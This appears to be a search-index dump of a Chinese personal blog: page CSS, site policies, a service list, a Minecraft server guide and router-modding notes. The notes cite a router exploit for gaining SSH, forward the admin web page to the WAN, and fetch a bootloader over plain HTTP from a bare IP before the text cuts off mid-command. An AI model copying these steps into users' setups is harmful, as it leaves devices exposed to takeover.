ease;--f-button-transform:none;--f-button-svg-width:20px;--f-button-svg-height:20px;--f-button-svg-stroke-width:1.5;--f-button-svg-fill:none;--f-button-svg-filter:none;--f-button-svg-disabled-opacity:0.65}.f-button{display:flex;justify-content:center;align-items:center;box-sizing:content-box;position:relative;margin:0;padding:0;width:var(--f-button-width);height:var(--f-button-height);border:var(--f-button-border);border-radius:var(--f-button-border-radius);color:var(--f-button-color);background:var(--f-button-bg);box-shadow:var(--f-button-shadow);pointer-events:all;cursor:pointer;transition:var(--f-button-transition)}@media(hover:hover){.f-button:hover:not([disabled]){color:var(--f-button-hover-color);background-color:var(--f-button-hover-bg)}}.f-button:active:not([disabled]){background-color:var(--f-button-active-bg)}.f-button:focus:not(:focus-visible){outline:0}.f-button:focus-visible{outline:0;box-shadow:inset 0 0 0 var(--f-button-outline,2px) var(--f-button-outline-color,var(--f-button-color))}.f-button svg{width:var(--f-button-svg-width);height:var(--f-button-svg-height);fill:var(--f-button-svg-fill);stroke:currentColor;stroke-width:var(--f-button-svg-stroke-width);stroke-linecap:round;stroke-linejoin:round;transition:opacity .15s ease;transform:var(--f-button-transform);filter:var(--f-button-svg-filter);pointer-events:none}.f-button[disabled]{cursor:default}.f-button[disabled] svg{opacity:var(--f-button-svg-disabled-opacity)}.f-carousel__nav .f-button.is-next,.f-carousel__nav .f-button.is-prev,.fancybox__nav .f-button.is-next,.fancybox__nav .f-button.is-prev{position:absolute;z-index:1}.is-horizontal .f-carousel__nav .f-button.is-next,.is-horizontal .f-carousel__nav .f-button.is-prev,.is-horizontal .fancybox__nav .f-button.is-next,.is-horizontal .fancybox__nav .f-button.is-prev{top:50%;transform:translateY(-50%)}.is-horizontal .f-carousel__nav .f-button.is-prev,.is-horizontal .fancybox__nav .f-button.is-prev{left:var(--f-button-prev-pos)}.is-horizontal .f-carousel__nav .f-button.is-next,.is-horizontal .fancybox__nav .f-button.is-next{right:var(--f-button-next-pos)}.is-horizontal.is-rtl .f-carousel__nav .f-button.is-prev,.is-horizontal.is-rtl .fancybox__nav .f-button.is-prev{left:auto;right:var(--f-button-next-pos)}.is-horizontal.is-rtl .f-carousel__nav .f-button.is-next,.is-horizontal.is-rtl .fancybox__nav .f-button.is-next{right:auto;left:var(--f-button-prev-pos)}.is-vertical .f-carousel__nav .f-button.is-next,.is-vertical .f-carousel__nav .f-button.is-prev,.is-vertical .fancybox__nav .f-button.is-next,.is-vertical .fancybox__nav .f-button.is-prev{top:auto;left:50%;transform:translateX(-50%)}.is-vertical .f-carousel__nav .f-button.is-prev,.is-vertical .fancybox__nav .f-button.is-prev{top:var(--f-button-next-pos)}.is-vertical .f-carousel__nav .f-button.is-next,.is-vertical .fancybox__nav .f-button.is-next{bottom:var(--f-button-next-pos)}.is-vertical .f-carousel__nav .f-button.is-next svg,.is-vertical .f-carousel__nav .f-button.is-prev svg,.is-vertical .fancybox__nav .f-button.is-next svg,.is-vertical .fancybox__nav .f-button.is-prev svg{transform:rotate(90deg)}html.with-fancybox{width:auto;overflow:visible;scroll-behavior:auto}html.with-fancybox body{touch-action:none}html.with-fancybox body.hide-scrollbar{width:auto;margin-right:calc(var(--fancybox-body-margin,0px) + var(--fancybox-scrollbar-compensate,0px));overflow:hidden!important;overscroll-behavior-y:none}.fancybox__container{--fancybox-color:#dbdbdb;--fancybox-hover-color:#fff;--fancybox-bg:rgba(24, 24, 27, 0.98);--fancybox-slide-gap:10px;--f-spinner-width:50px;--f-spinner-height:50px;--f-spinner-color-1:rgba(255, 255, 255, 0.1);--f-spinner-color-2:#bbb;--f-spinner-stroke:3.65;position:fixed;top:0;left:0;bottom:0;right:0;direction:ltr;display:flex;flex-direction:column;box-sizing:border-box;margin:0;padding:0;color:#f8f8f8;-webkit-tap-highlight-color:transparent;overflow:visible;z-index:var(--fancybox-zIndex,1050);outline:0;transform-origin:top left;-webkit-text-size-adjust:100%;-moz-text-size-adjust:none;-ms-text-size-adjust:100%;text-size-adjust:100%;overscroll-behavior-y:contain}.fancybox__container *,.fancybox__container ::after,.fancybox__container ::before{box-sizing:inherit}.fancybox__backdrop{position:fixed;top:0;left:0;bottom:0;right:0;z-index:-1;background:var(--fancybox-bg);opacity:var(--fancybox-opacity,1);will-change:opacity}.fancybox__carousel{position:relative;box-sizing:border-box;flex:1;min-height:0;z-index:10;overflow-y:visible;overflow-x:clip}.fancybox__viewport{width:100%;height:100%}.fancybox__viewport.is-draggable{cursor:move;cursor:grab}.fancybox__viewport.is-dragging{cursor:move;cursor:grabbing}.fancybox__track{display:flex;margin:0 auto;height:100%}.fancybox__slide{flex:0 0 auto;position:relative;display:flex;flex-direction:column;align-items:center;width:100%;height:100%;margin:0 var(--fancybox-slide-gap) 0 0;padding:4px;overflow:auto;transform:translate3d(0,0,0);backface-visibility:hidden}.fancybox__container:not(.is-compact) .fancybox__slide.has-close-btn{padding-top:40px}.fancybox__slide.has-html5video,.fancybox__slide.has-iframe,.fancybox__slide.has-video{overflow:hidden}.fancybox__slide.has-image{overflow:hidden}.fancybox__slide.has-image.is-animating,.fancybox__slide.has-image.is-selected{overflow:visible}.fancybox__slide::after,.fancybox__slide::before{content:\"\";flex:0 0 0;margin:auto}.fancybox__content{align-self:center;display:flex;flex-direction:column;position:relative;margin:0;padding:2rem;max-width:100%;color:var(--fancybox-content-color,#374151);background:var(--fancybox-content-bg,#fff);cursor:default;border-radius:0;z-index:20}.is-loading .fancybox__content{opacity:0}.is-draggable .fancybox__content{cursor:move;cursor:grab}.can-zoom_in .fancybox__content{cursor:zoom-in}.can-zoom_out .fancybox__content{cursor:zoom-out}.is-dragging .fancybox__content{cursor:move;cursor:grabbing}.fancybox__content [contenteditable],.fancybox__content [data-selectable]{cursor:auto}.fancybox__slide.has-image>.fancybox__content{padding:0;background:rgba(0,0,0,0);min-height:1px;background-repeat:no-repeat;background-size:contain;background-position:center center;transition:none;transform:translate3d(0,0,0);backface-visibility:hidden}.fancybox__slide.has-image>.fancybox__content>picture>img{width:100%;height:auto;max-height:100%}.is-zooming-in .fancybox__viewport:not(.is-dragging) .fancybox__slide:not(.is-selected) .fancybox__content,.is-zooming-out .fancybox__slide:not(.is-selected) .fancybox__content{visibility:hidden}.is-animating .fancybox__content,.is-dragging .fancybox__content{filter:blur(0);will-change:transform,width,height}.fancybox-image{margin:auto;display:block;width:100%;height:100%;min-height:0;object-fit:contain;user-select:none}.fancybox__caption{align-self:center;max-width:100%;flex-shrink:0;margin:0;padding:14px 0 4px 0;overflow-wrap:anywhere;line-height:1.375;color:var(--fancybox-color,currentColor);opacity:var(--fancybox-opacity,1);cursor:auto;visibility:visible}.is-closing .fancybox__caption,.is-loading .fancybox__caption{opacity:0;visibility:hidden}.is-compact .fancybox__caption{padding-bottom:0}.f-button.is-close-btn{--f-button-svg-stroke-width:2;position:absolute;top:0;right:8px;z-index:40}.fancybox__content>.f-button.is-close-btn{--f-button-width:34px;--f-button-height:34px;--f-button-border-radius:4px;--f-button-color:var(--fancybox-color, #fff);--f-button-hover-color:var(--fancybox-color, #fff);--f-button-bg:transparent;--f-button-hover-bg:transparent;--f-button-active-bg:transparent;--f-button-svg-width:22px;--f-button-svg-height:22px;position:absolute;top:-38px;right:0;opacity:.75}.is-loading .fancybox__content>.f-button.is-close-btn{visibility:hidden}.is-zooming-out .fancybox__content>.f-button.is-close-btn{visibility:hidden}.fancybox__content>.f-button.is-close-btn:hover{opacity:1}.fancybox__footer{padding:0;margin:0;position:relative}.fancybox__footer .fancybox__caption{width:100%;padding:24px;opacity:var(--fancybox-opacity,1);transition:all .25s ease}.is-compact .fancybox__footer{position:absolute;bottom:0;left:0;right:0;z-index:20;background:rgba(24,24,27,.5)}.is-compact .fancybox__footer .fancybox__caption{padding:12px}.is-compact .fancybox__content>.f-button.is-close-btn{--f-button-border-radius:50%;--f-button-color:#fff;--f-button-hover-color:#fff;--f-button-outline-color:#000;--f-button-bg:rgba(0, 0, 0, 0.6);--f-button-active-bg:rgba(0, 0, 0, 0.6);--f-button-hover-bg:rgba(0, 0, 0, 0.6);--f-button-svg-width:18px;--f-button-svg-height:18px;--f-button-svg-filter:none;top:5px;right:5px}.fancybox__nav{--f-button-width:50px;--f-button-height:50px;--f-button-border:0;--f-button-border-radius:50%;--f-button-color:var(--fancybox-color);--f-button-hover-color:var(--fancybox-hover-color);--f-button-bg:transparent;--f-button-hover-bg:rgba(24, 24, 27, 0.3);--f-button-active-bg:rgba(24, 24, 27, 0.5);--f-button-shadow:none;--f-button-transition:all 0.15s ease;--f-button-transform:none;--f-button-svg-width:26px;--f-button-svg-height:26px;--f-button-svg-stroke-width:2.5;--f-button-svg-fill:none;--f-button-svg-filter:drop-shadow(1px 1px 1px rgba(24, 24, 27, 0.5));--f-button-svg-disabled-opacity:0.65;--f-button-next-pos:1rem;--f-button-prev-pos:1rem;opacity:var(--fancybox-opacity,1)}.fancybox__nav .f-button:before{position:absolute;content:\"\";top:-30px;right:-20px;left:-20px;bottom:-30px;z-index:1}.is-idle .fancybox__nav{animation:.15s ease-out both f-fadeOut}.is-idle.is-compact .fancybox__footer{pointer-events:none;animation:.15s ease-out both f-fadeOut}.fancybox__slide>.f-spinner{position:absolute;top:50%;left:50%;margin:var(--f-spinner-top,calc(var(--f-spinner-width) * -.5)) 0 0 var(--f-spinner-left,calc(var(--f-spinner-height) * -.5));z-index:30;cursor:pointer}.fancybox-protected{position:absolute;top:0;left:0;right:0;bottom:0;z-index:40;user-select:none}.fancybox-ghost{position:absolute;top:0;left:0;width:100%;height:100%;min-height:0;object-fit:contain;z-index:40;user-select:none;pointer-events:none}.fancybox-focus-guard{outline:0;opacity:0;position:fixed;pointer-events:none}.fancybox__container:not([aria-hidden]){opacity:0}.fancybox__container.is-animated[aria-hidden=false] .fancybox__carousel>:not(.fancybox__viewport),.fancybox__container.is-animated[aria-hidden=false] .fancybox__slide>:not(.fancybox__content),.fancybox__container.is-animated[aria-hidden=false]>:not(.fancybox__backdrop,.fancybox__carousel){animation:.25s ease .1s backwards f-fadeIn}.fancybox__container.is-animated[aria-hidden=false] .fancybox__backdrop{animation:.35s ease backwards f-fadeIn}.fancybox__container.is-animated[aria-hidden=true] .fancybox__carousel>:not(.fancybox__viewport),.fancybox__container.is-animated[aria-hidden=true] .fancybox__slide>:not(.fancybox__content),.fancybox__container.is-animated[aria-hidden=true]>:not(.fancybox__backdrop,.fancybox__carousel){animation:.15s ease forwards f-fadeOut}.fancybox__container.is-animated[aria-hidden=true] .fancybox__backdrop{animation:.35s ease forwards f-fadeOut}.has-html5video .fancybox__content,.has-iframe .fancybox__content,.has-map .fancybox__content,.has-pdf .fancybox__content,.has-vimeo .fancybox__content,.has-youtube .fancybox__content{max-width:100%;flex-shrink:1;min-height:1px;overflow:visible}.has-iframe .fancybox__content,.has-map .fancybox__content,.has-pdf .fancybox__content{width:100%;height:100%}.fancybox__container:not(.is-compact) .has-iframe .fancybox__content,.fancybox__container:not(.is-compact) .has-map .fancybox__content,.fancybox__container:not(.is-compact) .has-pdf .fancybox__content{width:calc(100% - 120px);height:90%}.has-html5video .fancybox__content,.has-vimeo .fancybox__content,.has-youtube .fancybox__content{width:960px;height:540px;max-width:100%;max-height:100%}.has-html5video .fancybox__content,.has-map .fancybox__content,.has-pdf .fancybox__content,.has-vimeo .fancybox__content,.has-youtube .fancybox__content{padding:0;background:rgba(24,24,27,.9);color:#fff}.has-map .fancybox__content{background:#e5e3df}.fancybox__html5video,.fancybox__iframe{border:0;display:block;height:100%;width:100%;background:rgba(0,0,0,0)}.fancybox-placeholder{border:0!important;clip:rect(1px,1px,1px,1px)!important;-webkit-clip-path:inset(50%)!important;clip-path:inset(50%)!important;height:1px!important;margin:-1px!important;overflow:hidden!important;padding:0!important;position:absolute!important;width:1px!important;white-space:nowrap!important}.f-carousel__thumbs{--f-thumb-width:96px;--f-thumb-height:72px;--f-thumb-outline:0;--f-thumb-outline-color:#5eb0ef;--f-thumb-opacity:1;--f-thumb-hover-opacity:1;--f-thumb-selected-opacity:1;--f-thumb-border-radius:2px;--f-thumb-offset:0px;--f-button-next-pos:0;--f-button-prev-pos:0}.f-carousel__thumbs.is-classic{--f-thumb-gap:8px;--f-thumb-opacity:0.5;--f-thumb-hover-opacity:1;--f-thumb-selected-opacity:1}.f-carousel__thumbs.is-modern{--f-thumb-gap:4px;--f-thumb-extra-gap:20px;--f-thumb-clip-width:46px}.f-thumbs{position:relative;flex:0 0 auto;margin:0;overflow:hidden;-webkit-tap-highlight-color:transparent;user-select:none;perspective:1000px;transform:translateZ(0)}.f-thumbs .f-spinner{position:absolute;top:0;left:0;width:100%;height:100%;border-radius:2px;background-image:linear-gradient(#ebeff2,#e2e8f0);z-index:-1}.f-thumbs .f-spinner svg{display:none}.f-thumbs.is-vertical{height:100%}.f-thumbs__viewport{width:100%;height:auto;overflow:hidden}.f-thumbs__track{display:flex;will-change:transform}.f-thumbs__slide{position:relative;flex:0 0 auto;box-sizing:content-box;display:flex;align-items:center;justify-content:center;padding:0;margin:0;width:var(--f-thumb-width);min-width:var(--f-thumb-width);height:var(--f-thumb-height);overflow:visible;cursor:pointer}.f-thumbs__slide.is-loading img{opacity:0}.is-classic .f-thumbs__viewport{height:100%}.is-modern .f-thumbs__track{width:max-content}.is-modern .f-thumbs__track::before{content:\"\";position:absolute;top:0;bottom:0;left:calc(var(--left,0)*1px);width:calc(100% - var(--width,0)*1px);cursor:pointer}.is-modern .f-thumbs__slide{--clip-path:inset( 0 calc( (var(--f-thumb-width, 0) - var(--f-thumb-clip-width, 0)) * 0.5 * (1 - var(--progress, 0)) ) round var(--f-thumb-border-radius, 0) );transform:translate3d(calc(var(--shift,0) * -1px),0,0);transition:none;pointer-events:none}.is-modern .f-thumbs__slide>*{clip-path:var(--clip-path)}.is-modern:not(.is-using-mouse) .f-thumbs__slide:focus-within{filter:drop-shadow(-1px 0 0 var(--f-thumb-outline-color)) drop-shadow(2px 0 0 var(--f-thumb-outline-color)) drop-shadow(0 -1px 0 var(--f-thumb-outline-color)) drop-shadow(0 2px 0 var(--f-thumb-outline-color))}.is-modern.in-touch .f-thumbs__slide{filter:none}.is-modern.is-resting .f-thumbs__slide{transition:all .33s ease}.is-modern.is-resting .f-thumbs__slide>*{transition:all .33s ease}.f-thumbs__slide__button{appearance:none;width:100%;height:100%;margin:0;padding:0;border:0;position:relative;border-radius:var(--f-thumb-border-radius);overflow:hidden;background:rgba(0,0,0,0);outline:0;cursor:pointer;pointer-events:auto;touch-action:manipulation;opacity:var(--f-thumb-opacity);transition:opacity .2s ease}.f-thumbs__slide__button:hover{opacity:var(--f-thumb-hover-opacity)}.f-thumbs__slide__button:focus:not(:focus-visible){outline:0}.f-thumbs__slide__button:focus-visible{outline:0;opacity:var(--f-thumb-selected-opacity)}.is-nav-selected .f-thumbs__slide__button{opacity:var(--f-thumb-selected-opacity)}.is-nav-selected .f-thumbs__slide__button::after{content:\"\";position:absolute;top:0;left:0;right:0;height:auto;bottom:0;border:var(--f-thumb-outline,0) solid var(--f-thumb-outline-color,transparent);border-radius:var(--f-thumb-border-radius);animation:f-fadeIn .2s ease-out;z-index:10}.f-thumbs__slide__img{position:absolute;overflow:hidden;top:0;right:0;bottom:0;left:0;width:100%;height:100%;padding:var(--f-thumb-offset);box-sizing:border-box;pointer-events:none;object-fit:cover}.f-thumbs.is-horizontal .f-thumbs__track{margin:0 auto;padding:8px 0 12px 0}.f-thumbs.is-horizontal .f-thumbs__slide{margin:0 var(--f-thumb-gap) 0 0}.f-thumbs.is-vertical .f-thumbs__track{flex-wrap:wrap;margin:auto 0;padding:0 8px}.f-thumbs.is-vertical .f-thumbs__slide{margin:0 0 var(--f-thumb-gap) 0}.fancybox__thumbs{--f-thumb-width:96px;--f-thumb-height:72px;--f-thumb-border-radius:2px;--f-thumb-outline:2px;--f-thumb-outline-color:#ededed;position:relative;opacity:var(--fancybox-opacity,1);transition:max-height .35s cubic-bezier(.23,1,.32,1)}.fancybox__thumbs.is-classic{--f-thumb-gap:8px;--f-thumb-opacity:0.5;--f-thumb-hover-opacity:1}.fancybox__thumbs.is-classic .f-spinner{background-image:linear-gradient(rgba(255,255,255,.1),rgba(255,255,255,.05))}.fancybox__thumbs.is-modern{--f-thumb-gap:4px;--f-thumb-extra-gap:20px;--f-thumb-clip-width:46px;--f-thumb-opacity:1;--f-thumb-hover-opacity:1}.fancybox__thumbs.is-modern .f-spinner{background-image:linear-gradient(rgba(255,255,255,.1),rgba(255,255,255,.05))}.fancybox__thumbs.is-horizontal{padding:0 var(--f-thumb-gap)}.fancybox__thumbs.is-vertical{padding:var(--f-thumb-gap) 0}.is-compact .fancybox__thumbs{--f-thumb-width:64px;--f-thumb-clip-width:32px;--f-thumb-height:48px;--f-thumb-extra-gap:10px}.fancybox__thumbs.is-masked{max-height:0!important}.is-closing .fancybox__thumbs{transition:none!important}.fancybox__toolbar{--f-progress-color:var(--fancybox-color, rgba(255, 255, 255, 0.94));--f-button-width:46px;--f-button-height:46px;--f-button-color:var(--fancybox-color);--f-button-hover-color:var(--fancybox-hover-color);--f-button-bg:rgba(24, 24, 27, 0.65);--f-button-hover-bg:rgba(70, 70, 73, 0.65);--f-button-active-bg:rgba(90, 90, 93, 0.65);--f-button-border-radius:0;--f-button-svg-width:24px;--f-button-svg-height:24px;--f-button-svg-stroke-width:1.5;--f-button-svg-filter:drop-shadow(1px 1px 1px rgba(24, 24, 27, 0.15));--f-button-svg-fill:none;--f-button-svg-disabled-opacity:0.65;display:flex;flex-direction:row;justify-content:space-between;margin:0;padding:0;font-family:-apple-system,BlinkMacSystemFont,\"Segoe UI Adjusted\",\"Segoe UI\",\"Liberation Sans\",sans-serif;color:var(--fancybox-color,currentColor);opacity:var(--fancybox-opacity,1);text-shadow:var(--fancybox-toolbar-text-shadow,1px 1px 1px rgba(0,0,0,.5));pointer-events:none;z-index:20}.fancybox__toolbar :focus-visible{z-index:1}.fancybox__toolbar.is-absolute,.is-compact .fancybox__toolbar{position:absolute;top:0;left:0;right:0}.is-idle .fancybox__toolbar{pointer-events:none;animation:.15s ease-out both f-fadeOut}.fancybox__toolbar__column{display:flex;flex-direction:row;flex-wrap:wrap;align-content:flex-start}.fancybox__toolbar__column.is-left,.fancybox__toolbar__column.is-right{flex-grow:1;flex-basis:0}.fancybox__toolbar__column.is-right{display:flex;justify-content:flex-end;flex-wrap:nowrap}.fancybox__infobar{padding:0 5px;line-height:var(--f-button-height);text-align:center;font-size:17px;font-variant-numeric:tabular-nums;-webkit-font-smoothing:subpixel-antialiased;cursor:default;user-select:none}.fancybox__infobar span{padding:0 5px}.fancybox__infobar:not(:first-child):not(:last-child){background:var(--f-button-bg)}[data-fancybox-toggle-slideshow]{position:relative}[data-fancybox-toggle-slideshow] .f-progress{height:100%;opacity:.3}[data-fancybox-toggle-slideshow] svg g:first-child{display:flex}[data-fancybox-toggle-slideshow] svg g:last-child{display:none}.has-slideshow [data-fancybox-toggle-slideshow] svg g:first-child{display:none}.has-slideshow [data-fancybox-toggle-slideshow] svg g:last-child{display:flex}[data-fancybox-toggle-fullscreen] svg g:first-child{display:flex}[data-fancybox-toggle-fullscreen] svg g:last-child{display:none}:fullscreen [data-fancybox-toggle-fullscreen] svg g:first-child{display:none}:fullscreen [data-fancybox-toggle-fullscreen] svg g:last-child{display:flex}.f-progress{position:absolute;top:0;left:0;right:0;height:3px;transform:scaleX(0);transform-origin:0;transition-property:transform;transition-timing-function:linear;background:var(--f-progress-color,var(--f-carousel-theme-color,#0091ff));z-index:30;user-select:none;pointer-events:none}"},{"title":"留言版","path":"/say/index.html","content":"留言/评论须知：禁止发表违法暴乱，黄赌毒（包括但不限于）的言论本站支持邮件发送评论信息（收到回复时），在评论时请务必使用真实可用的邮箱（如果没有收到回复邮件可以把noreplay@hzchu.top加入白名单）拒绝无意义灌水，同ip五次以上封禁网址（包括昵称指向和评论内容）禁止以下类型推广链接（包括引流，拉人头等）含色情，反动（包括但不限于）广告链接（京东淘宝等，不过会看情况处理，合理讨论不会删除）如果遇到加载缓慢记得刷新~ 当然，记住文明上网，合理发言就好U*•ェ•U 在下方开始留言吧~"},{"title":"设置","path":"/settings/index.html","content":"Umami统计 默认启用 当前状态：loading 访问数据统计 禁用/启用 黑夜模式 默认跟随系统 切换 图片节点优选 默认启用 当前状态：loading 节点：loading 禁用/启用 更新节点信息 Ai摘要 默认禁用 当前状态：loading 禁用/启用 加载动画 默认启用 当前状态：loading 禁用/启用"},{"title":"免责声明","path":"/documents/disclaimer/index.html","content":"本站内容仅为个人言论，不代表站长本人所属（或曾经所属）机构或集体的观点。评论区的内容仅代表该评论发布者的观点，不代表本站认同该言论，且不对此内容产生的影响承担责任。 由于本站所发布的内容有其特定背景，而社会环境不断变化，又因获取资料信息限制，本站不对所发布内容之准确性、完整性、可靠性、可用性和及时性做保证。因此，相关读者有义务自行对所有内容在其预期用途中的适用性进行检查。在任何情况下，本站都不对因使用本站内容而造成的或与之有关的任何间接、附带或结果性损失负责或承担责任。 本站所发布的内容包含有外部网站链接，仅为方便读者而设。本站在添加链接时已尽可能检查其是否违反相关法律法规，但是外部网站内容始终由其相关提供者或运营者负责，本站无法控制这些外部网站，因此本站不对其内容承担任何责任。 最后更新日期：2024/07/29/15:25:00"},{"title":"隐私政策","path":"/documents/privacy-policy/index.html","content":"信息收集 本站重视访客的隐私和个人信息保护，但为了更好的服务质量，我们可能会收集和使用您的相关信息： 用于保持状态的Cookies 储存个性化配置的LocalStorage 用户的User-Agent 数据。 有关您计算机的信息，包括但不限于IP 地址、浏览器类型和版本以及操作系统类型和版本 ； 您主动提交给本站的个人信息，包括昵称、邮箱、网址； 有关您访问和使用本网站的信息，包括但不限于引荐来源、访问日期和时间、页面浏览量以及网站导航路径。 本站为深色模式切换、评论基础信息记录等功能，会通过LocalStorage在您的浏览器中进行本地存储以提供更便捷的体验，您可以随时清除浏览器中保存的所有 Cookies 以及 LocalStorage。 信息使用 对于收集到的 IP 地址、User-Agent等用户信息，本站有多个用途： 通过Umami做分析之用，且仅博主可见； 在评论页面展示所在省份； 昵称仅作访客身份辨识。昵称信息全站访客可见； 邮箱地址将用于验证访客真实性，及接收评论回复通知； 提交评论时可选是否填写网址项，仅为方便博主回访及个人网站的推广。网址信息全站访客可见。 其他符合法律规定的合理用途。 我们保留您自由选择的权利，在本站（blog.hzchu.top）中可以在左下角的设置界面中关闭Umami统计。而其他站点可以在LocalStorage中设置umami.disabled值为1以关闭Umami统计。该操作不会影响任何站点的正常使用 如何共享、转让您的个人信息 本站提供的服务可能会包含第三方的产品和服务，或包含通往他们的链接。本站无法控制第三方的隐私政策和规则，并且不对此承担任何责任。 本站不会主动公开披露用户信息，但以下情况除外： 中国的法律法规规定应当公开披露的信息； 与中国的国家安全、重大公共利益有关，或与犯罪侦查、起诉、审判和判决执行等有关，而应中国执法机构要求提供的； 出于维护您或其他个人的生命、财产等重大合法权益但又很难得到本人同意的； 您自行在本站评论区公开的个人信息； 本政策另有特别规定的情况。 该隐私政策仅针对以上未特殊标明的hzchu.top及757678.xyz下站点生效。 本站保留在任何时间修改、修订或更新本页政策内容的权利。 最后更新日期：2024/07/29/15:25:00"},{"title":"列表","path":"/wiki/Serve-list/index.html","content":"数据未统计完毕 状态监控：Thun888’s Service Status 公开 d.hzchu.top 短链接服务 TT-hkBaseH-SLA gt.hzchu.top 反代谷歌翻译API接口（/_/TranslateWebserverUi/data/batchexecute） 数据统计 (757678.xyz) ​\tTT-hkSelf-Coding停止服务 pan.hzchu.top Ztale,网盘 TT-hkH-SLA upload.hzchu.top 原用于fclouds图片上传 废弃L-SLA mcmap.hzchu.top fclouds地图，带端口60181访问 ​\tHome-ikuai-kvm停止服务 私有 hightlight-code-api.hzchu.top 语法高亮接口，详情参阅「使用pygments对代码进行高亮，并插入任意网页」 Hey以下两个反代并不长久受到支持，在未来会统一迁移，请勿在正式环境中使用 raw.hzchu.top 反代raw.githubusercontent.com BaseH-SLA jsd.hzchu.top 反代cdn.jsdelivr.net BaseH-SLA static.hzchu.top 镜像部分资源 assets/static at master · thun888/assets (github.com) BaseH-SLA cfproxy.hzchu.top 自由反代服务 BaseH-SLA faster-gist.hzchu.top 反代gist.github.com/thun888 TT-hkH-SLA faster-raw-git.hzchu.top 反代raw.githubusercontent.com TT-hkH-SLA onlinedisplay-api.hzchu.top 用于展示博主状态 TT-hkH-SLA pic.hzchu.top 图床 如果你想使用可以发邮件申请配额哦 Home-ikuaiTT-hk(frp)BaseH-SLA *onep.hzchu.top 图床节点 Home-ikuai(node)TT-hk(main)BaseH-SLA 其它"},{"title":"About Artalk","path":"/wiki/Artalk-doc/index.html","content":"Artalk 一款简洁有趣的自托管评论系统 官方文档：[Artalk(v2)](https://artalk.js.org/)，本文档做存档处理，不再更新。历史悠久，已从项目页面下架 特性 有趣有爱 自托管 支持Markdown 表情自定 滑稽表情包 管理员密码，防冒名 验证码，提交频率限制 通知中心，邮件提醒 仅管理员可评论 无限层级回复 滚动加载更多 内容自动保存 暗黑模式 评论折叠 一页多个评论 TypeScript 内容摘自Artalk仓库 本页面最后编辑时间为2021/7/21，在日后的版本中可能不再适用，请以官方仓库信息为准"},{"title":"峰间云海","path":"/wiki/fcloud/index.html","content":"Hey 这里是峰间云海官方文档 简要介绍 这是一个纯生存¹的公益服（1.21），为了更多玩家游玩，我们关闭了正版验证，并使用外置登录²。 采用Fabric服务端，对生电友好。 同时，我们加入了一些实用类插件³，在不破坏原版体验下提高玩家体验。 注： 内测期间玩家流失严重，开启了死亡不掉落降低难度 参阅下文 以下为插件列表： MOD名 简析 Carpet 地毯端，提供一些实用的功能 Carpet-tis 一个 Carpet (fabric-carpet) 的扩展 mod gugle-carpet-addition 一个 Carpet (fabric-carpet) 的扩展 mod essentialaddons 一个 Carpet (fabric-carpet) 的扩展 mod minitweaks 一个 Carpet (fabric-carpet) 的扩展 mod Voicechat 语音聊天，需搭配对应客户端mod Dynmap 在线地图 Essential_commands 提供一些实用的命令 Image2map 将图片转化为地图 HTM 用于保护您的箱子、潜影盒、木桶、熔炉、高炉、烟熏炉等容器并设置信任人们打开它们。 Letmedespawn 即便一个生物拿起过武器、盔甲或者别的东西，它也会自然消失。当它们消失时，拿起的东西都会重新掉到地上 Deathlog 死亡日志，记录死亡地点和背包物品 servux MiniHUD服务端 Debugify 修bug NoChatReports 禁止聊天举报 Jade 玉支持 LuckPerms 权限管理 C^2M 优化 lithium 优化 krypton 优化 Ferritecore 优化 Clumps 优化 Chunky 区块预加载 chunksending 优化 smoothchunk 优化 servercore 优化 MCMOD 优化 vmp 优化 MCDR list: 扩展名 简析 AdvancedCalculator 计算器 Beep @对方 DayCountNBT 显示开服天数 Bot 假人管理 PrimeBackup 备份 talk 记录玩家聊天信息 游玩流程 添加Q群 在皮肤站注册（参阅下文） 下载1.21客户端 在群公告里获取IP并连接 BE玩家从这里下载1.21版本游玩 外置登录使用 为方便玩家使用皮肤，简化操作难度，我服已正式启用外置登录作为新的登录方式 JE 进入FClouds Skins注册账户并登录（邮箱请使用您的qq号加上@qq.com，邀请码从群内获取） image-20240718214053637 对于BE玩家请跳过以下部分 调整本地启动器。为启动器添加外置登录，对于支持的启动器，你可以直接将此按钮拖动至启动器。如启动器不支持，可以自行百度，接入点为https://mcskin.hzchu.top/api/yggdrasil image-20240718214245350 在账户列表里选择刚刚添加的皮肤站点，登录后选中 image-20240718214502311 enjoy it! BE 只可新建一个角色！ 在注册完成并新建角色后，连接服务器，可见如下画面 Screenshot_2024-07-19-22-28-20-596_com.mojang.minecraftpe.jpg 点击使用Mojang账户登录后填写角色名称（或皮肤站的账号）和密码即可 Screenshot_2024-07-19-22-28-00-763_com.mojang.minecraftpe.jpg"},{"title":"笔记","path":"/wiki/notes/index.html","content":"折腾 小米路由器 开启SSH 使用acecilia/OpenWRTInvasion，注意路由器要处于非中继情况下并连接外网 允许外网访问 在/etc/config/firewall中添加 12345678910config redirect &#x27;wan10081rdr1&#x27; option proto &#x27;tcp&#x27; option src_dport &#x27;10081&#x27; option dest_ip &#x27;192.168.31.1&#x27; option dest_port &#x27;80&#x27; option src &#x27;wan&#x27; option name &#x27;WEB10081&#x27; option target &#x27;DNAT&#x27; option ftype &#x27;1&#x27; option dest &#x27;lan&#x27; 将自身80端口映射到10081端口上 来自急需小米AX1800路由器设置端口转发远程登陆WEB管理页-恩山无线论坛 (right.com.cn) 刷breed 开启SSH 查看路由器分区表 R4A1234567891011121314root@XiaoQiang:~# cat /proc/mtddev: size erasesize namemtd0: 01000000 00010000 &quot;ALL&quot;mtd1: 00030000 00010000 &quot;Bootloader&quot;mtd2: 00010000 00010000 &quot;NULL&quot;mtd3: 00010000 00010000 &quot;Bdata&quot;mtd4: 00010000 00010000 &quot;Factory&quot;mtd5: 00010000 00010000 &quot;crash&quot;mtd6: 00010000 00010000 &quot;cfg_bak&quot;mtd7: 00100000 00010000 &quot;overlay&quot;mtd8: 00d00000 00010000 &quot;OS1&quot;mtd9: 00b30000 00010000 &quot;rootfs&quot;mtd10: 00170000 00010000 &quot;disk&quot;mtd11: 00010000 00010000 &quot;Config&quot; 备份分区，留意factory跟BootLoader对应的mtd分区，需要备份的是factory和BootLoader 12345678root@XiaoQiang:~# dd if=/dev/mtd4 of=/tmp/eeprom.bin128+0 records in128+0 records out65536 bytes (64.0KB) copied, 0.032859 seconds, 1.9MB/sroot@XiaoQiang:~# dd if=/dev/mtd1 of=/tmp/Bootloader.bin384+0 records in384+0 records out196608 bytes (192.0KB) copied, 0.095421 seconds, 2.0MB/s 下载到本地 image-20240713164411960 image-20240713164520809 下载breed 1cd /tmp &amp;&amp; wget http://121.5.163.108/download/breed-mt7621-pbr-m1.bin &amp;&amp; mv 